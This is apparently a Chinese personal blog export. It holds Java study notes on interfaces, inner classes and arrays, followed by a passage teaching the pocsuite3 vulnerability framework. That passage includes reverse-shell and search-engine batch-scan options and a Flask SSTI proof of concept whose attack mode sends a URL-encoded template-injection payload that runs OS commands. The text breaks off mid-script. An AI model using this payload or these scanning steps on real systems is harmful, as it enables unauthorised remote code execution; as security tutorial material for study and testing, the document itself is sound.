1.使用Interface 关键字定义\n * 类可以实现多个接口\n * 一定程度解决了类的单继承的局限性\n * 2.Java中，接口和类是并列的两个结构\n * \n * 3.定义接口：定义接口中的成员\n * \t3.1 JDK7及以前：只能够定义全局常量和抽象方法\n * \t\t>全局常量：public static final的, 但是书写时可以省略不写\n * \t\t>抽象方法：public abstract的\n * \n * \n * \t\t\n * \n * \t3.2 JDK8: 除了定义全局常量和抽象方法之外，还可以定义：静态方法、默认方法\n * \t\t\t\t\t\n * \t\t\t\n * \n * \n * \n * 4.接口中不能定义构造器！！！意味着接口不可以实例化\n * \n * 5.开发中，接口通过类去\"实现\"(implements)的方式来使用\n * \t\t\t如果实现类覆盖了接口中所有抽象方法，则该实现类有实例化\n * \t\t\t如果实现类没有覆盖接口中所有的抽象方法，则此实现类仍为一个抽象类\n * \t\t\t抽象类和接口中，叫实现，不叫重写\n * \n * \n * 6.Java类可以实现多个接口--->弥补了Java单继承性的局限性问题\n * \t格式：class AA extends BB implements CC, DD{  }\n * \n * \n * 7.接口和接口之间：也叫继承，可以多继承\n * \n * \n * 8.接口是具体使用，体现了多态性\n * 9.接口，实际上可以看做是一种规范\n * \n * 面试题：抽象类与接口有哪些异同？\n * \n * \n * 接口应用：代理模式、工厂模式(一种设计模式)\n * \n */\npublic class InterfaceTest {\n\tpublic static void main(String[] args) {\n\t\tPlane plane = new Plane();\n\t\tplane.fly();\n\t}\n}\n\n\ninterface AttackAble{\n\tvoid attack();\n}\n\ninterface Flyable{\n\t//全局常量\n\tpublic static final int MAX_SPEED = 7900;\n\tint MIN_SPEED = 1; //省略了public static final \n\t\n\t// 抽象方法\n\tpublic abstract void fly();\n\tvoid stop();  // 省略了public abstract\n\t\t\n}\n\n\nclass Plane implements Flyable{\n\t@Override  // 这叫：实现，不叫重写\n\tpublic void fly() {\n\t\tSystem.out.println(\"飞机通过引擎起飞\");\n\t};\n\t@Override\n\tpublic void stop() {\n\t\tSystem.out.println(\"驾驶员减速停止\");\n\t};\n\t\n}\n\n//只能还叫抽象类，要么就把抽象方法都实现了\nabstract class Kite implements Flyable{\n\t@Override  // 这叫：实现，不叫重写\n\tpublic void fly() {\n\t\tSystem.out.println(\"风筝通过风起飞\");\n\t};\n\t\n}\n\n//子弹类（\t实现多个接口）\nclass Bullet extends Object implements Flyable, AttackAble{   //先写继承父类，后写实现具体的接口\n\n\t@Override\n\tpublic void attack() {\n\t\t\n\t}\n\n\t@Override\n\tpublic void fly() {\n\t\t\n\t}\n\n\t@Override\n\tpublic void stop() {\n\t\t\n\t}\n\t\n}\n\ninterface AA{\n\tvoid method1();\n}\n\ninterface BB{\n\tvoid method2();\n}\n\ninterface CC extends BB,AA{\n\t\n}\n\n```\n\n```java\npackage cn.xpshuai.java5;\n/*JDK8: 除了定义全局常量和抽象方法之外，还可以定义：静态方法、默认方法\n * \n * \n * \n */\npublic class Java8Test {\n//\tpublic static void method1() {\n//\t\tSystem.out.println(\"北京\");\n//\t}\n\tpublic static void main(String[] args) {\n\t\tSubClass sub = new SubClass();\n\t\t//知识点1：接口中定义的静态方法，只能通过接口来调用\n\t\tCompareA.method1();\n\t\t//知识点2：通过实现类的对象，可以调用接口中默认方法，可重写\n\t\tsub.method2(); //没有method1()\n\t\t//知识点3：如果子类(或实现类)继承的父类和实现接口中有声明了同名同参数的方法\n\t\t// 子类在没有重写此方法的情况下，则调用的是父类中此方法 --> 类优先原则\n\t\tsub.method3();\n\t\t//知识点4：如果实现类实现了多个接口，而这个接口中定义了同名参数的默认方法\n\t\t//那么在实现类没有父类，且没有重写此方法的情况下，报错-->接口冲突\n\t\t// 这就需要我们必须实现此类中重写此方法\n\t}\n}\n\n\nclass SubClass extends SuperClas implements CompareA,CompareB{\n\t@Override\n\tpublic void method2() {\n\t\tSystem.out.println(\"compareA:上海222222\");\n\t}\n\t\n\t//知识点5：如何在子类(实现类)的方法中调用父类、接口中被重写的方法\n\tpublic void myMethod() {\n\t\tmethod3(); //调自己的\n\t\tsuper.method3(); //调父类的\n\t\t//调接口中的默认方法\n\t\tCompareA.super.method3();\n\t\tCompareB.super.method3();\n\t}\n\t\n\t\n\t\n}\n```\n\n\n\n\n\n### 内部类（用的少）\n\n> 一种类成员\n\n```java\npackage cn.xpshuai.java5;\n/*\n * 类的内部成员之五: 内部类\n * 1.Java中允许将一个类A声明在另一个类B中，则类A就是内部类，类B称为外部类\n * 2.内部类分类： 成员内部类(静态、非静态) vs\t局部内部类(方法内、代码块内、构造器内)\n * \n * 3.成员内部类：\n * \t\t一方面，作为外部类的成员：\n * \t\t\t>调用外部类的结构\n * \t\t\t>可以被static修饰\n * \t\t\t>可以被权限修饰符修饰\n * \n * \n * \t\t另一方面，作为一个类：\n * \t\t\t>类内可以定义属性、方法、构造器\n * \t\t\t>可以被final修饰，表示此类不能被继承\n * \t\t\t>可被abstract修饰，表示不能被实例化\n * \n * 4.1 如何实例化成员内部类对象？\n * \n * 4.2 如何在成员内部类中区分调用外部类的结构？\n * \t\t\n * 4.3 开发中，局部内部类的使用\n * \t\t\n * \n * \n * \n */\npublic class InnerClassTest {\n\tpublic static void main(String[] args) {\n\t\t//创建Food实例(静态的成员内部类)\n\t\tPeople.Food food = new People.Food();\n\t\tfood.show();\n\t\t\n\t\t//创建Food2实例(非静态的成员内部类)\n//\t\tPeople.Food2 food2 = new People.Food2();\n\t\tPeople people = new People();\n\t\tPeople.Food2 food2 = people.new Food2(\"大白菜\");\n\t\tfood2.show();\n\t}\n}\n\n\nclass People{\n\tString name;\n\tint age;\n\tpublic void eat() {\n\t\tSystem.out.println(\"people eat\");\n\t}\n\t\n\t// 静态成员内部类\n\tstatic class Food{ // abstract \n\t\tString name;\n\t\tint age;\n\t\tpublic void show() {\n\t\t\tSystem.out.println(\"food1\");\n\t\t}\n//\t\teat();\n\t}\n\t// 非静态成员内部类\n\tclass Food2{\n\t\tString name;\n\n\t\tpublic Food2(String name) {\n\t\t\tthis.name = name;\n\t\t}\n\t\t\n\t\tpublic void show() {\n\t\t\tSystem.out.println(name + \"food22\");\n\t\t}\n//\t\tPeople.this.eat();  //调用外部类属性(非静态)\n\t\t\n\t\tpublic void display(String name) {\n\t\t\tSystem.out.println(name);  // 形参\n\t\t\tSystem.out.println(this.name);  //内部类的属性\n\t\t\tSystem.out.println(People.this.name); //外部类的属性\n\t\t\t\n\t\t\t\n\t\t\t\n\t\t}\n\t\t\n\t\t\n\t}\n\t\n\t\n\t\n\tpublic void method() {\n\t\t//局部内部类\n\t\tclass AA{\n\t\t\t\n\t\t}\n\t} \n\t\n\t{\n\t\t//局部内部类\n\t\tclass BB{\n\t\t\t\n\t\t}\n\t\t\n\t}\n\t\n\t// 构造器\n\tpublic People() {\n\t\t//局部内部类\n\t\tclass CC{\n\t\t\t\n\t\t}\n\t}\n\t\n\t//返回一个实现了Comparable接口的类的对象\n\tpublic Comparable getComparable() {\n\t\t//创建一个实现了Comparable接口的类：局部内部类\n\t\tclass MyComparable implements Comparable{\n\t\t\t@Override\n\t\t\tpublic int compareTo(Object obj) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t}\n\t\treturn new MyComparable();\n\t}\t\n}\n```\n\n局部内部类使用注意点：\n\n```java\npublic class Test{\n    \tpublic void method() {\n\t\t//局部内部类的方法中，如果调用局部内部类所声明的方法中的局部变量的话，\n\t\t//要求此局部变量声明为final\n\t\t//局部变量: jdk7之前需要加final，jdk8后可省略，但默认也是的\n\t\tint num = 11;\n\t\t\n\t\t//局部内部类\n\t\tclass AA{\n\t\t\tpublic void show() {\n\t\t\t\t//只能用，不能修改局部变量，其实是一个副本\n//\t\t\t\tnum = 22;  //报错\n\t\t\t\tSystem.out.println(num);\n\t\t\t}\n\t\t}\n\t} \n    \n    \n}\n```\n\n\n\n> 内容逻辑有些混乱，仅为个人学习笔记......\n\n\n\n","tags":["OOP"],"categories":["Java学习"]},{"title":"Java学习之数组","url":"%2Fposts%2F63254%2F","content":"\n\n\n### 数组\n\n- 数组(Array)，是多个**相同类型数据**按**一定顺序排列**的集合，并使用**一个名字命名**，并通过**编号**的方式对这些数据进行统一管理。\n- 数组本身就是**引用数据类型**，而数组中的元素可以是**任何数据类型**。\n- 创建数组对象会在内存中开辟一整块**连续的空间**，而数组名中引用的是这块连续空间的**首地址**。\n- 数组的**长度一旦确定，就不能修改**。\n\n\n\n### 一维数组\n\n#### 使用\n\n```java\npublic class ArrayTest {\n\tpublic static void main(String[] args) {\n\t\t\n\t\tint[] ids; // 声明\n\t\tids = new int[] {1001, 1002, 1003, 1004, 1005, 1006}; //初始化方式1(静态初始化)：数组的初始化和数组元素的赋值操作同时进行\n\t\t\n\t\tString[] names = new String[5]; //动态初始化：数组的初始化和数组元素的赋值操作分开进行\n\t\t//一旦初始化完毕，数组长度就确定了\n\t\tint[] ididids ={1001, 1002, 1003, 1004, 1005, 1006}; //类型推断(非标准写法)\n\t\t\n\t\t//错误写法...\n\t\t//int[] arr1 = new int[];\n\t\t//int[5] arr1 = new int[];\n\t\t//int[] arr1 = new int[3]{1,2,3};\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t//2.调用指定位置的元素: 通过索引[0,n-1]\n\t\tnames[0] = \"张三\";  // 通过角标赋值\n\t\tnames[1] = \"陈奕迅\";\n\t\tnames[2] = \"朱一龙\";\n\t\tnames[3] = \"张杰\";\n\t\tnames[4] = \"伍佰\";  // charAt(0)，只要不是数据库交互，都是从0开始\n\t\tSystem.out.print(names[1]);\n\t\t\n\t\t\n\t\t\n\t    //3.如何获取数组长度: .length属性\n\t\tSystem.out.print(names.length);\n\t\tSystem.out.println(ids.length);\n\t\t\n\t\t\n\t\t\n\t\t //4.如何遍历数组\n\t\tfor(int i=0; i < names.length; i++) {  //最大到长度-1\n\t\t\tSystem.out.println(\"姓名：\" + names[i] + \"\\t学号：\" + ids[i]);\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\t //5.数组元素的默认初始化值\n\t\t// 若数组元素是整型：默认初始化值为0\n\t\t//  ...浮点型：0.0\n\t\t// 若数组元素是char：默认初始化值为0 ,形式上为\"空格\"\n\t\t//  ...布尔型：false\n\t\t// ... 引用数据类型时(比如String)：null\n\t\tint[] arr1 = new int[4];\n\t\tfor (int i = 0; i < arr1.length; i++) {\n\t\t\tSystem.out.println(arr1[i]);\n\t\t}\n\t\t// 若数组元素是String：默认初始化值为null\n\t\tString[] arr2 = new String[4];\n\t\tfor (int i = 0; i < arr2.length; i++) {\n\t\t\tSystem.out.println(arr2[i]);\n\t\t}\n\t\t\n\t\t\n\t\t //6.一维数组的内存解析\n\n\t\t\n\t\t\n\t\tSystem.out.println(\"111\");\n\t\t// \n\t}\n}\n\n```\n\n#### 一维数组的内存解析\n\n**首先，在jvm中，内存的简化结构如下:**\n\n![](http://image.xpshuai.cn/%E7%AE%80%E5%8C%96%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84.jpg)\n\n\n\n**一维数组的内存解析如下：**\n\n![](http://image.xpshuai.cn/%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%86%85%E5%AD%98%E8%A7%A3%E6%9E%90.png)\n\n\n\n**引用计数算法：**当栈中没有变量指向堆空间的地址，就会自动回收这段堆中的垃圾地址\n\n\n\n### 二维数组\n\n对于二维数组，可以看做是一维数组又作为另一个一个数组的元素而存在。\n\n其实，从数组底层的运行机制来看，并没有多维数组。\n\n#### 使用\n\n```java\npublic class DoubleArrayTest {\n\tpublic static void main(String[] args) {\n\t\t//* 1.声明和初始化\n\t\t//二维\n\t\t//静态初始化\n\t\tint[][] arr2 = new int[][]{{1,2,3}, {4,5,6}, {7,8,9}};\n\t\t// 动态初始化\n\t\tString[][] arr22 = new String[3][2]; // 行列\n\t\tString[][] arr222 = new String[3][];\n\t\tString arr2222[][] = new String[3][4];\n\t\tint[][] arr22222 ={{1,2,3}, {4,5,6}, {7,8,9}};\n\t\tString[][] names = new String[4][2];\n\t\t\n\t\t//错误情况：\n\t\t//String[][] arr22 = new String[][4];\n\t\t\n\t\t\n\t\t//2.调用指定位置的元素\n\t\tnames[0][0] = \"张三\";  // 通过角标赋值\n\t\tnames[0][1] = \"陈奕迅\";\n\t\tnames[1][0] = \"朱一龙\";\n\t\tnames[1][1] = \"张杰\";\n\t\tnames[2][0] = \"伍佰\";  \n\t\tnames[2][1] = \"迪丽热巴\";  \n\t\tnames[3] = new String[2]; //\n\t\t//System.out.println(names[1][0]);\n\t\tfor (int i = 0; i < names.length; i++) {\n\t\t\tfor (int j = 0; j < names[i].length; j++) {\n\t\t\t\tSystem.out.print(names[i][j] + \"\\t\"); //未赋值的为null\n\t\t\t}\n\t\t\tSystem.out.println();\n\t\t}\n\t\t\n\t\t\n\t\t\n\t    //3.如何获取数组长度: .length属性\n\t\tSystem.out.println(names.length);  //获取的是外层数组的长度\n\t\tSystem.out.println(names[0].length); // 获取的外层第一个元素的数组的长度\n\t\tSystem.out.println(names[1].length);\n\t\t\n\t\t\n\t\t\n\t\t//4.如何遍历二维数组：两层（先遍历指定行再遍历列）\n\t\tfor (int i = 0; i < names.length; i++) {\n\t\t\tfor (int j = 0; j < names[i].length; j++) {\n\t\t\t\tSystem.out.print(names[i][j] + \"\\t\"); //未赋值的为null\n\t\t\t}\n\t\t\tSystem.out.println();\n\t\t}\n\n\t\t\n\t\t\n\t\t//5.二位数组元素的默认初始化值\n\t\t// 外层元素(是一个地址值)，内层元素(同一维)\n\t\tint[][] arrDouble = new int[4][3];\n\t\tSystem.out.println(arrDouble);  // 二维的地址值：[[I@15db9742\n\t\tSystem.out.println(arrDouble[0]);  //外层是一个地址值   [I@6d06d69c\n\t\tSystem.out.println(arrDouble[0][0]); // 是0\n\t\t\n\t\tString[][] arrDoubleS = new String[4][3];\n\t\tSystem.out.println(arrDoubleS[0]);  //是一个地址值\n\t\tSystem.out.println(arrDoubleS[0][0]); // 是null\n\n\t\t\n\t\t\n\t\t\n\t\t //6.二维数组的内存解析\n\t}\n}\n\n```\n\n\n\n#### 二维数组的内存解析\n\n![](http://image.xpshuai.cn/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E5%86%85%E5%AD%98%E8%A7%A3%E6%9E%901.jpg)\n\n![](http://image.xpshuai.cn/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E5%86%85%E5%AD%98%E8%A7%A3%E6%9E%902.jpg)\n\n\n\n\n\n\n\n### Arrays工具类\n\n```java\npublic class ArraysToolClassTest {\n\tpublic static void main(String[] args) {\n\t\t// boolean equals(int[] a,int[] b)\n\t\tint[] arr1 = new int[]{1,2,3};\n\t\tint[] arr2 = new int[] {10,3,9};\n\t\tboolean isEquals = Arrays.equals(arr1, arr2);\n\t\tSystem.out.println(isEquals);\n\t\t\n\t\t\n\t\t// String toString(int[] a)  输出数组信息\n\t\tSystem.out.println(Arrays.toString(arr1));\n\t\t\n\t\t\n\t\t// void fill(int[] a, int val)  将指定值填充到数组中\n\t\tArrays.fill(arr1, 9);\n\t\tSystem.out.println(Arrays.toString(arr1));\n\t\t\n\t\t\n\t\t// void sort(int[] a) \n\t\tArrays.sort(arr2);\n\t\tSystem.out.println(Arrays.toString(arr2));\n\t\t\n\t\t\n\t\t// int binarySearch(int[] a, int key)  二分查找(前提：数组必须有序)\n\t\tint[] arr3 = new int[] {-98,-50,-3,0,3,6,99,210,999};\n\t\tint index = Arrays.binarySearch(arr3, 210);  //如果找到了返回的是索引，如果找不到就返回负数\n\t\tSystem.out.println(index);\n\t}\n}\n\n```\n\n\n\n\n\n","tags":["数组"],"categories":["Java学习"]},{"title":"pocsuite简单学习","url":"%2Fposts%2F63001%2F","content":"\n\n\n### 简介\n\n> 读读英文...\n\npocsuite3 is an open-sourced remote vulnerability testing and proof-of-concept development framework developed by the [**Knownsec 404 Team**](http://www.knownsec.com/). It comes with a powerful proof-of-concept engine, many powerful features for the ultimate penetration testers and security researchers\n\n\n\n**Pocsuite有两种交互模式：**\n\n- 一个是命令行模式类似我们所知的sqlmap的界面\n- 另一个是控制台交互模式类似w3af或者matasploit的界面。\n\n### 安装\n\ngithub地址：https://github.com/knownsec/Pocsuite3\n\n也可通过pip安装：`pip install pocsuite3`\n\n安装完成后测试是否安装成功：\n\n```bash\npocsuite -h\t\t# pip安装的情况\npython cli.py -h\t# 适用于下载并解压zip压缩包的情况\n```\n\n\n\n### 基本使用\n\n\n\n#### **命令行模式下**常用命令：\n\n```bash\npocsuite -u http://example.com -r example.py -v 2 # 基础用法 v2开启详细信息\npocsuite -u http://example.com -r example.py -v 2 --shell # shell反连模式，基础用法 v2开启详细信息\npocsuite -r redis.py --dork service:redis --threads 20 # 从zoomeye搜索redis目标批量检测，线程设置为20\npocsuite -u http://example.com --plugins poc_from_pocs,html_report # 加载poc目录下所有poc,并将结果保存为html\npocsuite -f batch.txt --plugins poc_from_pocs,html_report # 从文件中加载目标，并使用poc目录下poc批量扫描\npocsuite -u 10.0.0.0/24 -r example.py --plugins target_from_cidr # 加载CIDR目标\npocsuite -u http://example.com -r ecshop_rce.py --attack --command \"whoami\" # ecshop poc中实现了自定义命令\n```\n\n\n\n#### verify和attack两种POC模式\n\n在使用Pocsuite的时候，我们可以用--verify参数来调用_verify方法，用--attack参数来调用_attack方法。\n\n```bash\n# POC内部方法如下\ndef _attack(self):\n    result = {}\n    #Write your code here\n    return self.parse_output(result)\n\ndef _verify(self):\n    result = {}\n    #Write your code here\n    return self.parse_output(result)\n```\n\n\n\nverify 模式：验证目标是否存在漏洞:\n\n```bash\n#  -r POC 加载POCfile 或者 remote from seebug websit\n#  -u URL\npocsuite -r tests/poc_example.py -u http://www.example.com/ --verify\n```\n\nattack 模式：向目标发起有效的攻击:\n\n```bash\npocsuite -r tests/poc_example.py -u http://www.example.com/ --attack\n```\n\n批量验证，将url写到一个txt:\n\n```bash\n# -f url_file（多个url）\npocsuite -r test/poc_example.py -f url.txt --verify\n```\n\n加载 tests 目录下的所有 PoC 对目标进行测试（可以充当扫描器角色）:\n\n```bash\npocsuite -r tests/ -u http://www.example.com --verify\n```\n\n使用多线程，默认线程数为1:\n\n```bash\npocsuite -r test/ -f url.txt --verify --threads 10\n```\n\n使用shell交互模式，对目标进行远程控制：\n\n```bash\npocsuite -u http://example.com -r example.py -v 2 --shell\n```\n\n从seebug下载poc\n\n```bash\n# -c configfile 加载选项from a configuration INI file\n\n```\n\n\n\n\n\n如果是压缩包解压zip源码的方式，运行脚本方式如下，切换到pocsuite3目录，运行`cli.py`文件：\n\n```bash\npython cli.py -u x.x.x.x -r example.py --verify\n```\n\n\n\n#### 一些模块接口\n\n```bash\n--dork (默认为zoomeye搜索搜索引擎)\n--dork-zoomeye 搜过关键字\n--dork-shodan 搜索关键字\n--dork-censys 搜索关键字\n--max-page 多少页\n--search-type  搜索类型选择API,Web or Host\n--vul-keyword seebug关键词搜索\n--ssv-id seebug漏洞编号\n--lhost shell模式反弹主机\n--lport shell模式反弹端口\n--comparison 比较两个搜索引擎\n  \n  \n# eg:从ZoomEye中调用host批量验证某个POC：\npocsuite -r weblogic_CVE-2017-10271.py --dork 'weblogic' --max-page 5 --thread 20 --verify\n\n```\n\n\n\n#### Optimization 其他选项\n\n```bash\n--plugins 加载插件\n--pocs-path     poc地址\n--threads      开启线程      \n--batch      自动默认选项\n--requires      检测需要安装的模块\n--quiet     没有logger\n--ppt   隐藏敏感信息\n```\n\n\n\n#### console模式\n\n`poc-console`进入console模式\n\n```bash\nGlobal commands:\n        help  帮助\n        use <module>  使用模块\n        search <search term> 搜索模块\n        list|show all   显示所有模块\n        exit 退出\n  Module commands:\n        run  使用设置的参数运行选中的脚本\n        back 返回上一步\n        set 参数名 参数值(当前模块)\n        setg 参数名 参数值(所有模块)\n        show info|options|all 打印information,options\n        check 使用--verify模式\n        attack 使用--attack模式\n        exploit 使用--shell模式\n```\n\n\n\n#### 其他参数\n\n```bash\noptional arguments:\n  -h, --help            show this help message and exit\n  --version             Show program's version number and exit\n  --update              Update Pocsuite\n  -v {0,1,2,3,4,5,6}    Verbosity level: 0-6 (default 1)\n\nTarget:\n  At least one of these options has to be provided to define the target(s)\n\n  -u URL [URL ...], --url URL [URL ...]\n                        Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")\n  -f URL_FILE, --file URL_FILE\n                        Scan multiple targets given in a textual file\n  -r POC [POC ...]      Load POC file from local or remote from seebug website\n  -c CONFIGFILE         Load options from a configuration INI file\n\nMode:\n  Pocsuite running mode options\n\n  --verify              Run poc with verify mode\n  --attack              Run poc with attack mode\n  --shell               Run poc with shell mode\n\nRequest:\n  Network request options\n\n  --cookie COOKIE       HTTP Cookie header value\n  --host HOST           HTTP Host header value\n  --referer REFERER     HTTP Referer header value\n  --user-agent AGENT    HTTP User-Agent header value\n  --random-agent        Use randomly selected HTTP User-Agent header value\n  --proxy PROXY         Use a proxy to connect to the target URL\n  --proxy-cred PROXY_CRED\n                        Proxy authentication credentials (name:password)\n  --timeout TIMEOUT     Seconds to wait before timeout connection (default 30)\n  --retry RETRY         Time out retrials times.\n  --delay DELAY         Delay between two request of one thread\n  --headers HEADERS     Extra headers (e.g. \"key1: value1\\nkey2: value2\")\n\nAccount:\n  Telnet404、Shodan、CEye、Fofa account options\n\n  --login-user LOGIN_USER\n                        Telnet404 login user\n  --login-pass LOGIN_PASS\n                        Telnet404 login password\n  --shodan-token SHODAN_TOKEN\n                        Shodan token\n  --fofa-user FOFA_USER\n                        fofa user\n  --fofa-token FOFA_TOKEN\n                        fofa token\n  --censys-uid CENSYS_UID\n                        Censys uid\n  --censys-secret CENSYS_SECRET\n                        Censys secret\n\nModules:\n  Modules(Seebug、Zoomeye、CEye、Fofa Listener) options\n\n  --dork DORK           Zoomeye dork used for search.\n  --dork-zoomeye DORK_ZOOMEYE\n                        Zoomeye dork used for search.\n  --dork-shodan DORK_SHODAN\n                        Shodan dork used for search.\n  --dork-censys DORK_CENSYS\n                        Censys dork used for search.\n  --dork-fofa DORK_FOFA\n                        Fofa dork used for search.\n  --max-page MAX_PAGE   Max page used in ZoomEye API(10 targets/Page).\n  --search-type SEARCH_TYPE\n                        search type used in ZoomEye API, web or host\n  --vul-keyword VUL_KEYWORD\n                        Seebug keyword used for search.\n  --ssv-id SSVID        Seebug SSVID number for target PoC.\n  --lhost CONNECT_BACK_HOST\n                        Connect back host for target PoC in shell mode\n  --lport CONNECT_BACK_PORT\n                        Connect back port for target PoC in shell mode\n  --comparison          Compare popular web search engines\n\nOptimization:\n  Optimization options\n\n  --plugins PLUGINS     Load plugins to execute\n  --pocs-path POCS_PATH\n                        User defined poc scripts path\n  --threads THREADS     Max number of concurrent network requests (default 1)\n  --batch BATCH         Automatically choose defaut choice without asking.\n  --requires            Check install_requires\n  --quiet               Activate quiet mode, working without logger.\n  --ppt                 Hiden sensitive information when published to the\n\n```\n\n\n\n\n\n\n\n### 编写POC插件\n\n> 详见pocsuite3下docs目录\n\n\n\n#### POC注意事项\n\n- 参照模版来写：模版地址：https://www.seebug.org/contribute/vul\n- 引入基础库，尽量避免第三方库。\n- 比较好的POC符合：\n  - 随机性：检测的数据，发送的数据要随机\n  - 通用性：考虑适应版本，各种不同的情况，操作系统等。\n  - 确定性：准确率的问题，这个POC一定能检测出漏洞来吗？\n- 关于CEYE的使用：监视服务以进行安全测试\n  有时一些漏洞的检测并没有数据回显，如SQL盲注，如命令执行无回显等等。这时可以借助DNS查询nslook或者curl来监控数据。CEYE为我们提供了这样一种服务，地址：http://ceye.io。\n\n\n\n#### 举例\n\n这里以Flask SSTI为例：\n\n```python\n\"\"\"\n功能：使用pocsuite对flask模板注入进行检测和利用\n@author: 剑胆琴心\npocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify\n\n\n__class__  返回类型所属的对象（类）\n__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。\n__base__   返回该对象所继承的基类\n// __base__和__mro__都是用来寻找基类的\n__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表\n__init__  类的初始化方法\n__globals__  对包含函数全局变量的字典的引用\n\"\"\"\nfrom pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY\n# from pocsuite3.api import get_listener_ip, get_listener_port\n# from pocsuite3.api import REVERSE_PAYLOAD\n# from pocsuite3.lib.utils import random_str\n\n\nclass FlaskPOCEXP(POCBase):\n    '''\n    0.编写的文件名应该符合poc命名规范：\"组成漏洞应用名_版本号_漏洞类型名称\", 其中文件名中所有字母改为小写，所有特殊符号改为下划线\n    1.编写DemoPOC类，继承自POCBase类\n    2.填写POC信息字段（如下）：\n    '''\n    vulID = '0' # ssvid ID，如果是提交漏洞同时提交POC，写成0\n    version = '1'   # 默认为1\n    author = ['剑胆琴心']     # POC作者的名字\n    vulDate = '2021-01-11'  # 漏洞公开的时间，不明确时可以写今天（我瞎写的时间）\n    createDate = '2021-01-11'\n    updateDate = '2021-01-11'\n    references = ['http://www.xpshuai.cn']  # 漏洞地址来源，0day可以不写\n    name = 'Python Flask SSTI(服务端模板注入)漏洞'      # POC名称\n    appPowerLink = 'http://www.xpshuai.cn'   # 漏洞厂商的主页地址\n    appName = 'Flask'       # 漏洞应用名称\n    appVersion = 'All'      # 漏洞影响版本\n    # vulType = VUL_TYPE.OTHER      # 漏洞类型(这里我瞎选的)\n    desc = '''\n        SSTI(Server-Side Template Injection)服务端模板注入，\n        就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式\n    '''\n    samples = ['']  # 漏洞样例，使用poc测试成功的网站\n    # PoC 第三方模块依赖说明。PoC 编写的时候要求尽量不要使用第三方模块，如果必要使用，请在 PoC 的基础信息部分，增加 install_requires 字段，按照以下格式：install_requies = [pip时候的模块名, pip时候的模块名]填写依赖的模块名。\n    install_requies = []\n\n    def _verify(self):\n        '''\n        验证模式\n        '''\n        result = {}\n        # 这里写验证代码...\n        path = \"/?name=\"\n        url = self.url + path\n        payload = \"{{22*22}}\"\n        # 第一次请求\n        try:\n            resq = requests.get(url + payload)\n            if resq and resq.status_code == 200 and \"484\" in resq.text:\n                result['VerifyInfo'] = {}   # 创建自定义的字典信息\n                result['VerifyInfo']['URL'] = url\n                result['VerifyInfo']['Payload'] = payload\n        except Exception as e:\n            pass\n        return self.parse_output(result)\n\n    def _attack(self):\n        '''\n        攻击模式\n        '''\n        result = {}\n        path = \"/?name=\"\n        url = self.url + path\n        payload = \"%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D\"\n        try:\n            resq = requests.get(url + payload)\n            if resq and resq.status_code == 200 and \"www\" in resq.text:\n                result['VerifyInfo'] = {}\n                result['VerifyInfo']['URL'] = url\n                result['VerifyInfo']['Name'] = payload\n        except Exception as e:\n            pass\n        return self.parse_output(result)\n\n    def parse_output(self, result):\n        '''\n     \t检测返回结果数据统一封装到这个方法里进行处理\n     \t'''\n        output = Output(self)\n        if result:\n            output.success(result)\n        else:\n            output.fail('target is not vulnerable')\n        return output\n\n\n# 注册POC类，千万不要忘记哦~~~\nregister_poc(FlaskPOCEXP)\n\n```\n\n若是压缩包方式下载的：放到pocsuite下的pocs目录，然后`python cli.py xxxxx`方式运行\n\n若是pip方式下载的：按下面方式\n\n验证漏洞：\n\n```shell\npocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify\n```\n\n攻击：\n\n```shell\npocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --attack\n```\n\n\n\n![](http://image.xpshuai.cn/flask_ssti_verify.png)\n\n![](http://image.xpshuai.cn/flask_ssti_attack.png)\n\n\n\n#### `command`外部参数传递。\n\n**改进一下**，希望可以接收用户输入的命令行参数，对目标系统实现半交互控制\n\n```python\n\"\"\"\n功能：使用pocsuite对flask模板注入进行检测和利用\n@author: 剑胆琴心\n@使用方法：\npocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify\npocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify  --command 'id'\n\n\"\"\"\n\nfrom collections import OrderedDict\nfrom pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict\nfrom pocsuite3.api import get_listener_ip, get_listener_port\nfrom pocsuite3.api import REVERSE_PAYLOAD\nfrom pocsuite3.lib.utils import random_str\n\n\nclass FlaskPOCEXP(POCBase):\n    '''\n    0.编写的文件名应该符合poc命名规范：\"组成漏洞应用名_版本号_漏洞类型名称\", 其中文件名中所有字母改为小写，所有特殊符号改为下划线\n    1.编写DemoPOC类，继承自POCBase类\n    2.填写POC信息字段（如下）：\n    '''\n    vulID = '0' # ssvid ID，如果是提交漏洞同时提交POC，写成0\n    version = '1'   # 默认为1\n    author = ['剑胆琴心']     # POC作者的名字\n    vulDate = '2021-01-11'  # 漏洞公开的时间，不明确时可以写今天（我瞎写的时间）\n    createDate = '2021-01-11'\n    updateDate = '2021-01-11'\n    references = 